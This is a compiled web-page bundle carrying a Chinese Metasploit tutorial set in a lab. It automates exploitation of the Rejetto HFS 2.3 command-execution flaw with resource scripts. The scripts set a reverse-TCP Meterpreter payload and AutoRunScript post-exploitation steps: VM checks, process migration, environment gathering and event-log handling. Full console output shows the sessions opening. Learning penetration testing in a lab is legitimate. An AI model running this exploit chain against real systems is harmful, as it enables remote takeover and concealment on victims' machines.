import{i as e,r as t,s as n,t as r}from"./app-DDh9ajWo.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-023-%E5%9C%A8Metasploit%E4%B8%AD%E4%BD%BF%E7%94%A8AutoRunScript.html","title":"在Metasploit中使用AutoRunScript","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"在Metasploit中使用AutoRunScript","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"在Metasploit中使用AutoRunScript","lock":"need"},"git":{"updatedTime":1777452223000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"b322b7352fc70ae7e8fe9dc99f96f0030ecd3d81","time":1777452223000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-023-在Metasploit中使用AutoRunScript.md"}`),a={name:`2022-05-02-023-在Metasploit中使用AutoRunScript.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="在metasploit中使用autorunscript" tabindex="-1"><a class="header-anchor" href="#在metasploit中使用autorunscript"><span>在Metasploit中使用AutoRunScript</span></a></h1><p>Metasploit提供了强大的AutoRunScript工具，可以通过收入show advanced查看AutoRunScript的选项。它可以实现自动化的后渗透测试，只需执行一次就可以获得对目标的控制权限。我们可以通过输入set AutoRunScript [script-name]来设置AutoRunScript的选项，也可以在资源脚本中直接设置，后者一次性自动完成全部渗透操作和后渗透操作。通过使用multi_script和multi_console_command模块，AutoRunScript还可以一次性运行多个后渗透脚本。下面我们来进行实战：</p><p>攻击机 kali 192.168.175.128</p><p>靶机 WinXP 192.168.175.130</p><p>注意：这里的示例中在靶机上部署了HFS 2.3，以攻击HFS2.3的漏洞为例实施的。有关如何部署HFS2.3服务，请参考《<a href="https://blog.csdn.net/l1028386804/article/details/86567192" target="_blank" rel="noopener noreferrer">Metasploit实战二之——对威胁建模(附加搭建CVE:2014-6287漏洞环境)</a>》。</p><h3 id="使用autorunscript选项中的multiscript模块" tabindex="-1"><a class="header-anchor" href="#使用autorunscript选项中的multiscript模块"><span>使用AutoRunScript选项中的multiscript模块</span></a></h3><h4 id="创建自动化后渗透脚本multi-script" tabindex="-1"><a class="header-anchor" href="#创建自动化后渗透脚本multi-script"><span>创建自动化后渗透脚本multi_script</span></a></h4><p>脚本内容如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run post/windows/gather/checkvm</span>
<span class="line">run post/windows/manage/migrate</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们将脚本multi_script保存到/root/my_scripts目录下。</p><p>这个脚本主要用于后渗透测试，实现了checkvm(检查目标系统是否运行在虚拟环境的模块)和migrate(将攻击载荷迁移到安全进程的模块)模块自动化的后渗透脚本。</p><h4 id="创建渗透脚本resource-complete" tabindex="-1"><a class="header-anchor" href="#创建渗透脚本resource-complete"><span>创建渗透脚本resource_complete</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use exploit/windows/http/rejetto_hfs_exec</span>
<span class="line">set payload windows/meterpreter/reverse_tcp</span>
<span class="line">set RHOST 192.168.175.130</span>
<span class="line">set RPORT 8080</span>
<span class="line">set LHOST 192.168.175.128</span>
<span class="line">set LPORT 2222</span>
<span class="line">set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个脚本同样保存到/root/my_scripts目录下</p><p>这个脚本设置了对HFS文件服务器进行渗透所必需的所有参数，并实现了攻击的自动化，也可以是使用multi_console_command对AutoRunScript进行设置，将multi_console_command设定为-rc，可以执行对个后渗透脚本。</p><h4 id="运行渗透脚本resource-complete" tabindex="-1"><a class="header-anchor" href="#运行渗透脚本resource-complete"><span>运行渗透脚本resource_complete</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">msf5 &gt; resource /root/my_scripts/resource_complete</span>
<span class="line">[*] Processing /root/my_scripts/resource_complete for ERB directives.</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; use exploit/windows/http/rejetto_hfs_exec</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set RHOST 192.168.175.130</span>
<span class="line">RHOST =&gt; 192.168.175.130</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set RPORT 8080</span>
<span class="line">RPORT =&gt; 8080</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set LHOST 192.168.175.128</span>
<span class="line">LHOST =&gt; 192.168.175.128</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set LPORT 2222</span>
<span class="line">LPORT =&gt; 2222</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script</span>
<span class="line">AutoRunScript =&gt; multi_console_command -rc /root/my_scripts/multi_script</span>
<span class="line">resource (/root/my_scripts/resource_complete)&gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.175.128:2222 </span>
<span class="line">[*] Using URL: http://0.0.0.0:8080/E9UzLCydhDL</span>
<span class="line">[*] Local IP: http://192.168.175.128:8080/E9UzLCydhDL</span>
<span class="line">[*] Server started.</span>
<span class="line">[*] Sending a malicious request to /</span>
<span class="line">[*] Payload request received: /E9UzLCydhDL</span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.175.130</span>
<span class="line">[*] Meterpreter session 1 opened (192.168.175.128:2222 -&gt; 192.168.175.130:1060) at 2019-01-26 10:16:09 +0800</span>
<span class="line">[*] Session ID 1 (192.168.175.128:2222 -&gt; 192.168.175.130:1060) processing AutoRunScript &#39;multi_console_command -rc /root/my_scripts/multi_script&#39;</span>
<span class="line">[*] Running Command List ...</span>
<span class="line">[!] Tried to delete %TEMP%\\xBDTumQie.vbs, unknown result</span>
<span class="line">[*] Server stopped.</span>
<span class="line"></span>
<span class="line">meterpreter &gt;</span>
<span class="line">[*] Checking if LIUYAZHUANG is a Virtual Machine .....</span>
<span class="line">[+] This is a VMware Virtual Machine</span>
<span class="line">[*] Running module against LIUYAZHUANG</span>
<span class="line">[*] Current server process: qQbMLQjEENOQL.exe (1592)</span>
<span class="line">[*] Spawning notepad.exe process to migrate to</span>
<span class="line">[+] Migrating to 1380</span>
<span class="line">[+] Successfully migrated to process 1380</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们看到，checkvm和migrate模块都已经成功执行，目标运行在VMWare上，控制程序也已经成功迁移到了1380进程上。</p><h4 id="使用autorunscript选项中的multiscript模块-1" tabindex="-1"><a class="header-anchor" href="#使用autorunscript选项中的multiscript模块-1"><span>使用AutoRunScript选项中的multiscript模块</span></a></h4><p>可以使用multiscript模块创建一个后渗透脚本</p><h4 id="创建后渗透脚本multi-scr-rc" tabindex="-1"><a class="header-anchor" href="#创建后渗透脚本multi-scr-rc"><span>创建后渗透脚本multi_scr.rc</span></a></h4><p>脚本内容如下:</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">checkvm</span>
<span class="line">migrate -n explorer.exe</span>
<span class="line">get_env</span>
<span class="line">event_manager -i</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们同样把这个脚本保存在/root/my_scripts目录下。</p><h4 id="创建渗透脚本resource-rc" tabindex="-1"><a class="header-anchor" href="#创建渗透脚本resource-rc"><span>创建渗透脚本resource_rc</span></a></h4><p>具体内容如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">use exploit/windows/http/rejetto_hfs_exec</span>
<span class="line">set payload windows/meterpreter/reverse_tcp</span>
<span class="line">set RHOST 192.168.175.130</span>
<span class="line">set RPORT 8080</span>
<span class="line">set LHOST 192.168.175.128</span>
<span class="line">set LPORT 2222</span>
<span class="line">set AutoRunScript multiscript -rc /root/my_script/multi_scr.rc</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="运行渗透脚本" tabindex="-1"><a class="header-anchor" href="#运行渗透脚本"><span>运行渗透脚本</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; resource /root/my_scripts/resource_rc</span>
<span class="line">[*] Processing /root/my_scripts/resource_rc for ERB directives.</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; use exploit/windows/http/rejetto_hfs_exec</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set RHOST 192.168.175.130</span>
<span class="line">RHOST =&gt; 192.168.175.130</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set RPORT 8080</span>
<span class="line">RPORT =&gt; 8080</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set LHOST 192.168.175.128</span>
<span class="line">LHOST =&gt; 192.168.175.128</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set LPORT 2222</span>
<span class="line">LPORT =&gt; 2222</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; set AutoRunScript multiscript -rc /root/my_script/multi_scr.rc</span>
<span class="line">AutoRunScript =&gt; multiscript -rc /root/my_script/multi_scr.rc</span>
<span class="line">resource (/root/my_scripts/resource_rc)&gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.175.128:2222 </span>
<span class="line">[*] Using URL: http://0.0.0.0:8080/YfmEYmEV9x</span>
<span class="line">[*] Local IP: http://192.168.175.128:8080/YfmEYmEV9x</span>
<span class="line">[*] Server started.</span>
<span class="line">[*] Sending a malicious request to /</span>
<span class="line">[*] Payload request received: /YfmEYmEV9x</span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.175.130</span>
<span class="line">[*] Meterpreter session 1 opened (192.168.175.128:2222 -&gt; 192.168.175.130:1065) at 2019-01-27 11:50:34 +0800</span>
<span class="line">[*] Session ID 1 (192.168.175.128:2222 -&gt; 192.168.175.130:1065) processing AutoRunScript &#39;multiscript -rc /root/my_script/multi_scr.rc&#39;</span>
<span class="line">[!] Tried to delete %TEMP%\\bMXpbLteZtoos.vbs, unknown result</span>
<span class="line">[*] Server stopped.</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,32)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};